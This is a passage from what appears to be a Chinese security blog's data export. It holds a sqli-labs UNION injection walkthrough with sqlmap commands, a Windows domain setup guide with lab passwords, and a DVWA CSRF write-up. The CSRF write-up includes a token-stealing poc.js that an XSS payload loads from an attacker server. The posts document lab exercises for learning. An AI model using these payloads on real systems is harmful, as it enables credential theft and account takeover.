src=\"https://i.imgur.com/ZIXMXUP.png\" alt=\"9\"></p>\n<p>order by 数字1~3显示的都与这个页面相同,表示至少有3个字段</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23</code></p>\n<p><img src=\"https://i.imgur.com/lfKFcjO.png\" alt=\"10\"></p>\n<p>图片上的报错信息是:</p>\n<p><code>SELECT * FROM users WHERE id=&#39;1&#39; order by 4#&#39; LIMIT 0,1\nUnknown column &#39;4&#39; in &#39;order clause&#39;</code></p>\n<p>说明第4个字段不存在,那就只有3个字段。</p>\n<h4 id=\"猜字段排序\"><a href=\"#猜字段排序\" class=\"headerlink\" title=\"猜字段排序\"></a>猜字段排序</h4><p>使用union select联合查询,后面接查到的字段个数。如下:</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"https://i.imgur.com/uyB1sZ5.png\" alt=\"11\"></p>\n<p>可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:</p>\n<p><img src=\"https://i.imgur.com/T9tGY5M.png\" alt=\"12\"></p>\n<p>标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。</p>\n<p><code>http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"https://i.imgur.com/iQTBrk4.png\" alt=\"13\"></p>\n<p>显示出id=2的数据信息。</p>\n<p>将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"https://i.imgur.com/EtoeD7e.png\" alt=\"14\"></p>\n<p>显示出字段顺序,推测字段中排序顺序应该是id,name,password。</p>\n<h3 id=\"获取数据库信息\"><a href=\"#获取数据库信息\" class=\"headerlink\" title=\"获取数据库信息\"></a>获取数据库信息</h3><p>user():返回当前数据库连接使用的用户</p>\n<p>database():返回当前数据库连接使用的数据库</p>\n<p>version():返回当前数据库的版本</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23</code></p>\n<p><img src=\"https://i.imgur.com/O4iLDlC.png\" alt=\"15\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p>group_concat函数:将查询到的多行结果连接成字符串</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></p>\n<p><img src=\"https://i.imgur.com/aW1ZQ52.png\" alt=\"16\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23</code></p>\n<p><img src=\"https://i.imgur.com/yXgseWp.png\" alt=\"17\"></p>\n<h3 id=\"获取值\"><a href=\"#获取值\" class=\"headerlink\" title=\"获取值\"></a>获取值</h3><p><code>http://10.60.250.214/Less-1/?id=-1&#39; union select 1,2,group_concat(username,&#39;:&#39;,password) from users%23</code></p>\n<p><img src=\"https://i.imgur.com/72LA4RH.png\" alt=\"18\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><h3 id=\"基础命令\"><a href=\"#基础命令\" class=\"headerlink\" title=\"基础命令\"></a>基础命令</h3><p>SQLMAP的基础命令如下：</p>\n<blockquote>\n<p>列举数据库</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-dbs</p>\n<blockquote>\n<p>当前数据库</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-current-db</p>\n<blockquote>\n<p>列数据库用户</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-users</p>\n<blockquote>\n<p>当前用户</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-current-user</p>\n<blockquote>\n<p>列举数据库的表名</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 -D “数据库” –-tables</p>\n<blockquote>\n<p>获取表的列名<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns</p>\n</blockquote>\n<blockquote>\n<p>获取表中的数据<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump</p>\n</blockquote>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><p><strong>-u</strong><br><font color=\"#8470FF\"><br><strong>指定url</strong><br></font></p>\n<p><strong>–dbs</strong><br><font color=\"#8470FF\"><br><strong>爆破数据库</strong><br></font></p>\n<p><strong>–batch</strong><br><font color=\"#8470FF\"><br><strong>默认运行</strong><br></font></p>\n<p><strong>–technique</strong><br><font color=\"#8470FF\"></font></p>\n<p>指定sqlmap使用的检测技术</p>\n<ul>\n<li><p>B:Boolean-based-blind  （布尔型型注入）</p>\n</li>\n<li><p>E:Error-based   （报错型注入）</p>\n</li>\n<li><p>U:Union query-based  （联合注入）</p>\n</li>\n<li><p>S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</p>\n</li>\n<li><p>T:Time-based blind  （基于时间延迟注入）</p>\n</li>\n</ul>\n\n\n<p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; --dbs --batch --technique B</code></p>\n<p><img src=\"https://i.imgur.com/6EobR3x.png\" alt=\"20\"></p>\n<p><img src=\"https://i.imgur.com/ZzNnuBy.png\" alt=\"19\"></p>\n<h3 id=\"获取表-1\"><a href=\"#获取表-1\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security --tables</code></p>\n<p><img src=\"https://i.imgur.com/RbMVkf4.png\" alt=\"22\"></p>\n<p><img src=\"https://i.imgur.com/yFC9jZD.png\" alt=\"21\"></p>\n<h3 id=\"获取表的列名\"><a href=\"#获取表的列名\" class=\"headerlink\" title=\"获取表的列名\"></a>获取表的列名</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns</code></p>\n<p><img src=\"https://i.imgur.com/keAEMDi.png\" alt=\"24\"></p>\n<p><img src=\"https://i.imgur.com/mkkn61S.png\" alt=\"23\"></p>\n<h3 id=\"获取表中数据\"><a href=\"#获取表中数据\" class=\"headerlink\" title=\"获取表中数据\"></a>获取表中数据</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns --dump</code></p>\n<p><img src=\"https://i.imgur.com/hclOrZ5.png\" alt=\"26\"></p>\n<p><img src=\"https://i.imgur.com/qrbRqfl.png\" alt=\"25\"></p>\n"}],"Post":[{"title":"2008R2域环境搭建","date":"2018-11-26T02:46:02.000Z","_content":"\n# 域环境搭建\n\n## 域控制器\n\n### 配置静态IP\n\n![001]( /img/Domain/001.png)\n\n### 安装域服务\n\n点击服务器管理器-添加角色-下一步-添加AD域服务：\n\n![002]( /img/Domain/002.png)\n\n![003]( /img/Domain/003.png)\n\n默认下一步即可。\n\n为了避免下面的步骤出错,先设置管理员用户账号密码`6yhn&UJM8ik,`\n\n![006]( /img/Domain/006.png)\n\n安装过后运行安装向导：\n\n![004]( /img/Domain/004.png)\n\n下一步后选择“在新林中新建域”：\n\n![005]( /img/Domain/005.png)\n\n设置域名称：\n\n\n\n![007]( /img/Domain/007.png)\n\n根据需求，选择林功能级别：(我这里是Windows2008R2的)\n\n![008]( /img/Domain/008.png)\n\n建立DNS服务：\n\n\n\n![009]( /img/Domain/009.png)\n\n默认选择后再次设置密码\n\n\n\n![010]( /img/Domain/010.png)\n\n![011]( /img/Domain/011.png)\n\n重启后安装成功。\n\n### 添加域用户\n\n在域管理中新建用户：\n\n![012]( /img/Domain/012.png)\n\n设置姓名、登录名：\n\n![013]( /img/Domain/013.png)\n\n设置密码：6yhn&UJM\n\n![014]( /img/Domain/014.png)\n\n下一步后确定即可。\n\n#### 设置域成员\n\n在另一台作为成员的Windows2008上设置,需要将DNS指向域控服务器：\n\n![015]( /img/Domain/015.png)\n\n\n\n在计算机属性中更改“计算机名称、域和工作组设置”:\n\n![016]( /img/Domain/016.png)\n\n选择要加入的域：\n\n![017]( /img/Domain/017.png)\n\n输入域控的凭证：\n\n![018]( /img/Domain/018.png)\n\n加域成功：\n\n![019]( /img/Domain/019.png)\n\n重启后，使用域用户登录：\n\n![020]( /img/Domain/020.png)\n\n查看所属域：\n\n![021]( /img/Domain/021.png)","source":"_posts/2008R2域环境搭建.md","raw":"---\n\ntitle: 2008R2域环境搭建\ndate: 2018-11-26 10:46:02\ntags: [环境搭建]\ncategories: 环境搭建\n---\n\n# 域环境搭建\n\n## 域控制器\n\n### 配置静态IP\n\n![001]( /img/Domain/001.png)\n\n### 安装域服务\n\n点击服务器管理器-添加角色-下一步-添加AD域服务：\n\n![002]( /img/Domain/002.png)\n\n![003]( /img/Domain/003.png)\n\n默认下一步即可。\n\n为了避免下面的步骤出错,先设置管理员用户账号密码`6yhn&UJM8ik,`\n\n![006]( /img/Domain/006.png)\n\n安装过后运行安装向导：\n\n![004]( /img/Domain/004.png)\n\n下一步后选择“在新林中新建域”：\n\n![005]( /img/Domain/005.png)\n\n设置域名称：\n\n\n\n![007]( /img/Domain/007.png)\n\n根据需求，选择林功能级别：(我这里是Windows2008R2的)\n\n![008]( /img/Domain/008.png)\n\n建立DNS服务：\n\n\n\n![009]( /img/Domain/009.png)\n\n默认选择后再次设置密码\n\n\n\n![010]( /img/Domain/010.png)\n\n![011]( /img/Domain/011.png)\n\n重启后安装成功。\n\n### 添加域用户\n\n在域管理中新建用户：\n\n![012]( /img/Domain/012.png)\n\n设置姓名、登录名：\n\n![013]( /img/Domain/013.png)\n\n设置密码：6yhn&UJM\n\n![014]( /img/Domain/014.png)\n\n下一步后确定即可。\n\n#### 设置域成员\n\n在另一台作为成员的Windows2008上设置,需要将DNS指向域控服务器：\n\n![015]( /img/Domain/015.png)\n\n\n\n在计算机属性中更改“计算机名称、域和工作组设置”:\n\n![016]( /img/Domain/016.png)\n\n选择要加入的域：\n\n![017]( /img/Domain/017.png)\n\n输入域控的凭证：\n\n![018]( /img/Domain/018.png)\n\n加域成功：\n\n![019]( /img/Domain/019.png)\n\n重启后，使用域用户登录：\n\n![020]( /img/Domain/020.png)\n\n查看所属域：\n\n![021]( /img/Domain/021.png)","slug":"2008R2域环境搭建","published":1,"updated":"2019-06-19T17:23:13.380Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istb400024dsbg2p1ltmm","content":"<h1 id=\"域环境搭建\"><a href=\"#域环境搭建\" class=\"headerlink\" title=\"域环境搭建\"></a>域环境搭建</h1><h2 id=\"域控制器\"><a href=\"#域控制器\" class=\"headerlink\" title=\"域控制器\"></a>域控制器</h2><h3 id=\"配置静态IP\"><a href=\"#配置静态IP\" class=\"headerlink\" title=\"配置静态IP\"></a>配置静态IP</h3><p><img src=\"/img/Domain/001.png\" alt=\"001\"></p>\n<h3 id=\"安装域服务\"><a href=\"#安装域服务\" class=\"headerlink\" title=\"安装域服务\"></a>安装域服务</h3><p>点击服务器管理器-添加角色-下一步-添加AD域服务：</p>\n<p><img src=\"/img/Domain/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/Domain/003.png\" alt=\"003\"></p>\n<p>默认下一步即可。</p>\n<p>为了避免下面的步骤出错,先设置管理员用户账号密码<code>6yhn&amp;UJM8ik,</code></p>\n<p><img src=\"/img/Domain/006.png\" alt=\"006\"></p>\n<p>安装过后运行安装向导：</p>\n<p><img src=\"/img/Domain/004.png\" alt=\"004\"></p>\n<p>下一步后选择“在新林中新建域”：</p>\n<p><img src=\"/img/Domain/005.png\" alt=\"005\"></p>\n<p>设置域名称：</p>\n<p><img src=\"/img/Domain/007.png\" alt=\"007\"></p>\n<p>根据需求，选择林功能级别：(我这里是Windows2008R2的)</p>\n<p><img src=\"/img/Domain/008.png\" alt=\"008\"></p>\n<p>建立DNS服务：</p>\n<p><img src=\"/img/Domain/009.png\" alt=\"009\"></p>\n<p>默认选择后再次设置密码</p>\n<p><img src=\"/img/Domain/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/Domain/011.png\" alt=\"011\"></p>\n<p>重启后安装成功。</p>\n<h3 id=\"添加域用户\"><a href=\"#添加域用户\" class=\"headerlink\" title=\"添加域用户\"></a>添加域用户</h3><p>在域管理中新建用户：</p>\n<p><img src=\"/img/Domain/012.png\" alt=\"012\"></p>\n<p>设置姓名、登录名：</p>\n<p><img src=\"/img/Domain/013.png\" alt=\"013\"></p>\n<p>设置密码：6yhn&amp;UJM</p>\n<p><img src=\"/img/Domain/014.png\" alt=\"014\"></p>\n<p>下一步后确定即可。</p>\n<h4 id=\"设置域成员\"><a href=\"#设置域成员\" class=\"headerlink\" title=\"设置域成员\"></a>设置域成员</h4><p>在另一台作为成员的Windows2008上设置,需要将DNS指向域控服务器：</p>\n<p><img src=\"/img/Domain/015.png\" alt=\"015\"></p>\n<p>在计算机属性中更改“计算机名称、域和工作组设置”:</p>\n<p><img src=\"/img/Domain/016.png\" alt=\"016\"></p>\n<p>选择要加入的域：</p>\n<p><img src=\"/img/Domain/017.png\" alt=\"017\"></p>\n<p>输入域控的凭证：</p>\n<p><img src=\"/img/Domain/018.png\" alt=\"018\"></p>\n<p>加域成功：</p>\n<p><img src=\"/img/Domain/019.png\" alt=\"019\"></p>\n<p>重启后，使用域用户登录：</p>\n<p><img src=\"/img/Domain/020.png\" alt=\"020\"></p>\n<p>查看所属域：</p>\n<p><img src=\"/img/Domain/021.png\" alt=\"021\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"域环境搭建\"><a href=\"#域环境搭建\" class=\"headerlink\" title=\"域环境搭建\"></a>域环境搭建</h1><h2 id=\"域控制器\"><a href=\"#域控制器\" class=\"headerlink\" title=\"域控制器\"></a>域控制器</h2><h3 id=\"配置静态IP\"><a href=\"#配置静态IP\" class=\"headerlink\" title=\"配置静态IP\"></a>配置静态IP</h3><p><img src=\"/img/Domain/001.png\" alt=\"001\"></p>\n<h3 id=\"安装域服务\"><a href=\"#安装域服务\" class=\"headerlink\" title=\"安装域服务\"></a>安装域服务</h3><p>点击服务器管理器-添加角色-下一步-添加AD域服务：</p>\n<p><img src=\"/img/Domain/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/Domain/003.png\" alt=\"003\"></p>\n<p>默认下一步即可。</p>\n<p>为了避免下面的步骤出错,先设置管理员用户账号密码<code>6yhn&amp;UJM8ik,</code></p>\n<p><img src=\"/img/Domain/006.png\" alt=\"006\"></p>\n<p>安装过后运行安装向导：</p>\n<p><img src=\"/img/Domain/004.png\" alt=\"004\"></p>\n<p>下一步后选择“在新林中新建域”：</p>\n<p><img src=\"/img/Domain/005.png\" alt=\"005\"></p>\n<p>设置域名称：</p>\n<p><img src=\"/img/Domain/007.png\" alt=\"007\"></p>\n<p>根据需求，选择林功能级别：(我这里是Windows2008R2的)</p>\n<p><img src=\"/img/Domain/008.png\" alt=\"008\"></p>\n<p>建立DNS服务：</p>\n<p><img src=\"/img/Domain/009.png\" alt=\"009\"></p>\n<p>默认选择后再次设置密码</p>\n<p><img src=\"/img/Domain/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/Domain/011.png\" alt=\"011\"></p>\n<p>重启后安装成功。</p>\n<h3 id=\"添加域用户\"><a href=\"#添加域用户\" class=\"headerlink\" title=\"添加域用户\"></a>添加域用户</h3><p>在域管理中新建用户：</p>\n<p><img src=\"/img/Domain/012.png\" alt=\"012\"></p>\n<p>设置姓名、登录名：</p>\n<p><img src=\"/img/Domain/013.png\" alt=\"013\"></p>\n<p>设置密码：6yhn&amp;UJM</p>\n<p><img src=\"/img/Domain/014.png\" alt=\"014\"></p>\n<p>下一步后确定即可。</p>\n<h4 id=\"设置域成员\"><a href=\"#设置域成员\" class=\"headerlink\" title=\"设置域成员\"></a>设置域成员</h4><p>在另一台作为成员的Windows2008上设置,需要将DNS指向域控服务器：</p>\n<p><img src=\"/img/Domain/015.png\" alt=\"015\"></p>\n<p>在计算机属性中更改“计算机名称、域和工作组设置”:</p>\n<p><img src=\"/img/Domain/016.png\" alt=\"016\"></p>\n<p>选择要加入的域：</p>\n<p><img src=\"/img/Domain/017.png\" alt=\"017\"></p>\n<p>输入域控的凭证：</p>\n<p><img src=\"/img/Domain/018.png\" alt=\"018\"></p>\n<p>加域成功：</p>\n<p><img src=\"/img/Domain/019.png\" alt=\"019\"></p>\n<p>重启后，使用域用户登录：</p>\n<p><img src=\"/img/Domain/020.png\" alt=\"020\"></p>\n<p>查看所属域：</p>\n<p><img src=\"/img/Domain/021.png\" alt=\"021\"></p>\n"},{"title":"DVWA-CSRF手记","date":"2018-10-19T10:50:20.000Z","_content":"\n# DVWA-CSRF手记\n\n---\n\n## LOW\n\n### Source:\n\n![low_001](/img/csrf/dvwa/low_001.png)\n\n### Analysis:\t\n\n```\n没有进行任何过滤,只检验两次密码是否相同；检验用burpsuite抓包后可构造url,当受害者点击后会把密码修改。\n```\n\n`http://192.168.1.110/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change`\n\n构造短网址\n\n![low_002](/img/csrf/dvwa/low_002.png)\n\n诱骗管理员点击链接，需要管理员之前有登录过DVWA,(记得设置为low)并保留有session信息。\n\n![low_003](/img/csrf/dvwa/low_003.png)\n\n密码修改成功。\n\n![low_004](/img/csrf/dvwa/low_004.png)\n\n但是这样做过于明显,管理员又不是傻子。\n\n### Process:\n\n通过img标签的src属性构造url。\n\n`<img src=\"http://suo.im/50R0sN\" border=\"0\" style=\"display:none;\"/>`\n\n将其藏入一个404的html页面中。\n\n![low_005](/img/csrf/dvwa/low_005.png)\n\n将`http://192.168.1.119/hack.html`用短链接构造后`http://suo.im/4LOi71`\n\n![low_006](/img/csrf/dvwa/low_006.png)\n\n![low_007](/img/csrf/dvwa/low_007.png)\n\n查看数据库\n\n![low_008](/img/csrf/dvwa/low_008.png)\n\n密码已经被修改了。\n\n![low_009](/img/csrf/dvwa/low_009.png)\n\n## Medium\n\n### Source:\n\n![medium_001](/img/csrf/dvwa/medumn_001.png)\n\n### Analysis:\t\n\n```\n$_SERVER['HTTP_REFERER']:获取服务器主机\n$_SERVER['HTTP_REFERER']：获取HTTP数据包中的referer参数的值,该参数表示访问到当前页面的前一页面。\neregi — 不区分大小写的正则表达式匹配\n在referer中匹配服务器主机,以此来防御csrf\n```\n\n如果还按照low的做的话会发生错误。\n\n![medium_002](/img/csrf/dvwa/medium_002.png)\n\n修改Referer值`http://192.168.1.119/192.168.1.110.html`\n\n![medium_003](/img/csrf/dvwa/medium_003.png)\n\n那么方法就出来了，在我服务器目录建一个`192.168.1.110.html`的文件不就好了。内容和hack.html一模一样。\n\n### Process:\n\n将`http://192.168.1.119/192.168.1.110.html`用短链接构造后`http://suo.im/4Ejm74`\n\n![medium_004](/img/csrf/dvwa/medium_004.png)\n\n![medium_005](/img/csrf/dvwa/medium_005.png)\n\n这个实验不算成功,发现了一个dvwa的问题，把cookie中的security改成了impossible,导致实验没法成功。去掉security=impossible再发送。\n\n![medium_006](/img/csrf/dvwa/medium_006.png)\n\n后来发现这是一个dvwa有时会出现的bug,重启下服务有几率解决。\n\n查看数据库\n\n![medium_007](/img/csrf/dvwa/medium_007.png)\n\n密码已经修改了。\n\n## High\n\n### Source:\n\n![high_001](/img/csrf/dvwa/high_001.png)\n\n### Analysis:\t\n\n```\n这里检查了tocken,tocken是包含在页面中的,所以要先获得管理员的token,这个token每次请求都会变化。\n```\n\n\n\n![high_002](/img/csrf/dvwa/high_002.png)\n\n像medium那样做会出现一个问题,如何获取token。\n\n本来想利用high级别的存储型xss来注入,但是绕过前端注入代码后发现下次访问依然会对长度限制。\n\n植入xss:\n\n`<iframe src='../csrf' onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>`\n\n![hign_003](/img/csrf/dvwa/high_003.png)\n\n### Process:\n\n利用DOM型。\n\n位于攻击者服务器的poc.js文件。\n\n```\nvar theUrl = 'http://192.168.1.126/vulnerabilities/csrf/';\nvar pass = '123456';\nif (window.XMLHttpRequest){\n    xmlhttp=new XMLHttpRequest();\n}else{\n    xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n}\nxmlhttp.withCredentials = true;\nvar hacked = false;\nxmlhttp.onreadystatechange=function(){\n    if (xmlhttp.readyState==4 && xmlhttp.status==200)\n    {\n        var text = xmlhttp.responseText;\n        var regex = /user_token\\' value\\=\\'(.*?)\\' \\/\\>/;\n        var match = text.match(regex);\n        var token = match[1];\n        var new_url = 'http://192.168.1.126/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'\n        if(!hacked){\n            alert('Got token:' + match[1]);\n            hacked = true;\n            xmlhttp.open(\"GET\", new_url, false );\n            xmlhttp.send();\n        }\n        count++;\n    }\n};\nxmlhttp.open(\"GET\", theUrl, false );\nxmlhttp.send();  \n```\n\n![high_004](/img/csrf/dvwa/high_004.png)\n\n`http://192.168.1.119/dvwa/vulnerabilities/xss_d/?default=English  #<script src=\"http://192.168.1.125/poc.js\"></script>`\n\n诱骗管理员点击即可,当然可以像之前的一样包装一下。这里就不做了。\n\n## Impossible\n\n### Source:\n\n![im_001](/img/csrf/dvwa/im_001.png)\n\n### Analysis:\t\n\n```\nImpossible级别的代码利用PDO技术防御SQL注入，而CSRF不仅有token,还需要原密码，简单粗暴。\n```\n\n","source":"_posts/DVWA-CSRF手记.md","raw":"---\ntitle: DVWA-CSRF手记\ndate: 2018-10-19 18:50:20\ntags: [DVWA,CSRF]\ncategories: CSRF\n---\n\n# DVWA-CSRF手记\n\n---\n\n## LOW\n\n### Source:\n\n![low_001](/img/csrf/dvwa/low_001.png)\n\n### Analysis:\t\n\n```\n没有进行任何过滤,只检验两次密码是否相同；检验用burpsuite抓包后可构造url,当受害者点击后会把密码修改。\n```\n\n`http://192.168.1.110/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change`\n\n构造短网址\n\n![low_002](/img/csrf/dvwa/low_002.png)\n\n诱骗管理员点击链接，需要管理员之前有登录过DVWA,(记得设置为low)并保留有session信息。\n\n![low_003](/img/csrf/dvwa/low_003.png)\n\n密码修改成功。\n\n![low_004](/img/csrf/dvwa/low_004.png)\n\n但是这样做过于明显,管理员又不是傻子。\n\n### Process:\n\n通过img标签的src属性构造url。\n\n`<img src=\"http://suo.im/50R0sN\" border=\"0\" style=\"display:none;\"/>`\n\n将其藏入一个404的html页面中。\n\n![low_005](/img/csrf/dvwa/low_005.png)\n\n将`http://192.168.1.119/hack.html`用短链接构造后`http://suo.im/4LOi71`\n\n![low_006](/img/csrf/dvwa/low_006.png)\n\n![low_007](/img/csrf/dvwa/low_007.png)\n\n查看数据库\n\n![low_008](/img/csrf/dvwa/low_008.png)\n\n密码已经被修改了。\n\n![low_009](/img/csrf/dvwa/low_009.png)\n\n## Medium\n\n### Source:\n\n![medium_001](/img/csrf/dvwa/medumn_001.png)\n\n### Analysis:\t\n\n```\n$_SERVER['HTTP_REFERER']:获取服务器主机\n$_SERVER['HTTP_REFERER']：获取HTTP数据包中的referer参数的值,该参数表示访问到当前页面的前一页面。\neregi — 不区分大小写的正则表达式匹配\n在referer中匹配服务器主机,以此来防御csrf\n```\n\n如果还按照low的做的话会发生错误。\n\n![medium_002](/img/csrf/dvwa/medium_002.png)\n\n修改Referer值`http://192.168.1.119/192.168.1.110.html`\n\n![medium_003](/img/csrf/dvwa/medium_003.png)\n\n那么方法就出来了，在我服务器目录建一个`192.168.1.110.html`的文件不就好了。内容和hack.html一模一样。\n\n### Process:\n\n将`http://192.168.1.119/192.168.1.110.html`用短链接构造后`http://suo.im/4Ejm74`\n\n![medium_004](/img/csrf/dvwa/medium_004.png)\n\n![medium_005](/img/csrf/dvwa/medium_005.png)\n\n这个实验不算成功,发现了一个dvwa的问题，把cookie中的security改成了impossible,导致实验没法成功。去掉security=impossible再发送。\n\n![medium_006](/img/csrf/dvwa/medium_006.png)\n\n后来发现这是一个dvwa有时会出现的bug,重启下服务有几率解决。\n\n查看数据库\n\n![medium_007](/img/csrf/dvwa/medium_007.png)\n\n密码已经修改了。\n\n## High\n\n### Source:\n\n![high_001](/img/csrf/dvwa/high_001.png)\n\n### Analysis:\t\n\n```\n这里检查了tocken,tocken是包含在页面中的,所以要先获得管理员的token,这个token每次请求都会变化。\n```\n\n\n\n![high_002](/img/csrf/dvwa/high_002.png)\n\n像medium那样做会出现一个问题,如何获取token。\n\n本来想利用high级别的存储型xss来注入,但是绕过前端注入代码后发现下次访问依然会对长度限制。\n\n植入xss:\n\n`<iframe src='../csrf' onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>`\n\n![hign_003](/img/csrf/dvwa/high_003.png)\n\n### Process:\n\n利用DOM型。\n\n位于攻击者服务器的poc.js文件。\n\n```\nvar theUrl = 'http://192.168.1.126/vulnerabilities/csrf/';\nvar pass = '123456';\nif (window.XMLHttpRequest){\n    xmlhttp=new XMLHttpRequest();\n}else{\n    xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n}\nxmlhttp.withCredentials = true;\nvar hacked = false;\nxmlhttp.onreadystatechange=function(){\n    if (xmlhttp.readyState==4 && xmlhttp.status==200)\n    {\n        var text = xmlhttp.responseText;\n        var regex = /user_token\\' value\\=\\'(.*?)\\' \\/\\>/;\n        var match = text.match(regex);\n        var token = match[1];\n        var new_url = 'http://192.168.1.126/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'\n        if(!hacked){\n            alert('Got token:' + match[1]);\n            hacked = true;\n            xmlhttp.open(\"GET\", new_url, false );\n            xmlhttp.send();\n        }\n        count++;\n    }\n};\nxmlhttp.open(\"GET\", theUrl, false );\nxmlhttp.send();  \n```\n\n![high_004](/img/csrf/dvwa/high_004.png)\n\n`http://192.168.1.119/dvwa/vulnerabilities/xss_d/?default=English  #<script src=\"http://192.168.1.125/poc.js\"></script>`\n\n诱骗管理员点击即可,当然可以像之前的一样包装一下。这里就不做了。\n\n## Impossible\n\n### Source:\n\n![im_001](/img/csrf/dvwa/im_001.png)\n\n### Analysis:\t\n\n```\nImpossible级别的代码利用PDO技术防御SQL注入，而CSRF不仅有token,还需要原密码，简单粗暴。\n```\n\n","slug":"DVWA-CSRF手记","published":1,"updated":"2019-06-19T17:23:13.380Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istb900044dsb814mq8ut","content":"<h1 id=\"DVWA-CSRF手记\"><a href=\"#DVWA-CSRF手记\" class=\"headerlink\" title=\"DVWA-CSRF手记\"></a>DVWA-CSRF手记</h1><hr>\n<h2 id=\"LOW\"><a href=\"#LOW\" class=\"headerlink\" title=\"LOW\"></a>LOW</h2><h3 id=\"Source\"><a href=\"#Source\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/csrf/dvwa/low_001.png\" alt=\"low_001\"></p>\n<h3 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight qml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">没有进行任何过滤,只检验两次密码是否相同；检验用burpsuite抓包后可构造<span class=\"built_in\">url</span>,当受害者点击后会把密码修改。</span><br></pre></td></tr></table></figure>\n\n<p><code>http://192.168.1.110/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</code></p>\n<p>构造短网址</p>\n<p><img src=\"/img/csrf/dvwa/low_002.png\" alt=\"low_002\"></p>\n<p>诱骗管理员点击链接，需要管理员之前有登录过DVWA,(记得设置为low)并保留有session信息。</p>\n<p><img src=\"/img/csrf/dvwa/low_003.png\" alt=\"low_003\"></p>\n<p>密码修改成功。</p>\n<p><img src=\"/img/csrf/dvwa/low_004.png\" alt=\"low_004\"></p>\n<p>但是这样做过于明显,管理员又不是傻子。</p>\n<h3 id=\"Process\"><a href=\"#Process\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>通过img标签的src属性构造url。</p>\n<p><code>&lt;img src=&quot;http://suo.im/50R0sN&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</code></p>\n<p>将其藏入一个404的html页面中。</p>\n<p><img src=\"/img/csrf/dvwa/low_005.png\" alt=\"low_005\"></p>\n<p>将<code>http://192.168.1.119/hack.html</code>用短链接构造后<code>http://suo.im/4LOi71</code></p>\n<p><img src=\"/img/csrf/dvwa/low_006.png\" alt=\"low_006\"></p>\n<p><img src=\"/img/csrf/dvwa/low_007.png\" alt=\"low_007\"></p>\n<p>查看数据库</p>\n<p><img src=\"/img/csrf/dvwa/low_008.png\" alt=\"low_008\"></p>\n<p>密码已经被修改了。</p>\n<p><img src=\"/img/csrf/dvwa/low_009.png\" alt=\"low_009\"></p>\n<h2 id=\"Medium\"><a href=\"#Medium\" class=\"headerlink\" title=\"Medium\"></a>Medium</h2><h3 id=\"Source-1\"><a href=\"#Source-1\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/csrf/dvwa/medumn_001.png\" alt=\"medium_001\"></p>\n<h3 id=\"Analysis-1\"><a href=\"#Analysis-1\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight 